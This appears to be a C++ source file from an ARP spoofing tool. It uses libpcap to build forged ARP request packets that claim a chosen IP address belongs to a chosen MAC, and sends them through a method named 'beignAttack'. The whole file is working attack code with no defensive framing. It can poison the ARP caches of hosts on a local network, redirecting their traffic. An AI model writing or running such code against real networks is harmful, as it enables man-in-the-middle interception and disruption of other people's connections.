#include "ArpSpoof.h"

///////////////////////////////////// public /////////////////////////////////////

ArpSpoof::ArpSpoof(NetworkAdapter &adapter)
{
	adapter.GetLocalMac(m_local_mac);
	m_adhandle = adapter.getAdapterHandle();
}

ArpSpoof::~ArpSpoof()
{

}

void ArpSpoof::beignAttack(uint32_t dst_ip, uint32_t src_ip, uint8_t *src_mac)
{
	uint8_t packet[sizeof(arp_packet)];

	make_arpspoof_packet(packet, dst_ip, src_ip, src_mac);

	if (pcap_sendpacket(m_adhandle, packet, sizeof(packet)) < 0)
	{
		printf("\npacket sending error");
	}
}

void ArpSpoof::beignAttack(uint32_t dst_ip, uint32_t src_ip)
{
	uint8_t packet[sizeof(arp_packet)];

	make_arpspoof_packet(packet, dst_ip, src_ip);

	if (pcap_sendpacket(m_adhandle, packet, sizeof(packet)) < 0)
	{
		printf("packet sending error");
	}
}

///////////////////////////////////// private /////////////////////////////////////

void ArpSpoof::make_arpspoof_packet(uint8_t *packet, 
	uint32_t dst_ip, uint32_t src_ip, uint8_t *src_mac)
{
	arp_packet arp_pkt;

	// -----------------填充以太网首部-----------------
	memcpy(arp_pkt.eh.saddr, src_mac, MAC_LEN);
	memset(arp_pkt.eh.daddr, 0xFF, MAC_LEN); // Broadcast
	arp_pkt.eh.prototype = htons(ETHPROTOCAL_ARP);

	// -----------------填充 ARP 首部-----------------
	arp_pkt.ah.arp_hrd = htons(HARD_ETHERNET);
	arp_pkt.ah.arp_pro = htons(ETHPROTOCAL_IPV4);
	arp_pkt.ah.arp_hln = MAC_LEN;
	arp_pkt.ah.arp_pln = IPV4_LEN;
	arp_pkt.ah.arp_op = htons(ARP_REQUEST);

	memcpy(arp_pkt.ah.arp_shaddr, src_mac, MAC_LEN);
	arp_pkt.ah.arp_spaddr = src_ip;
	memset(arp_pkt.ah.arp_thaddr, 0x00, MAC_LEN);
	arp_pkt.ah.arp_tpaddr = dst_ip;

	memcpy(packet, &arp_pkt, sizeof(arp_pkt));
}

void ArpSpoof::make_arpspoof_packet(uint8_t *packet, uint32_t dst_ip, uint32_t src_ip)
{
	make_arpspoof_packet(packet, dst_ip, src_ip, m_local_mac);
}

/////////////////////////////////////////////////////////////////////////////////////
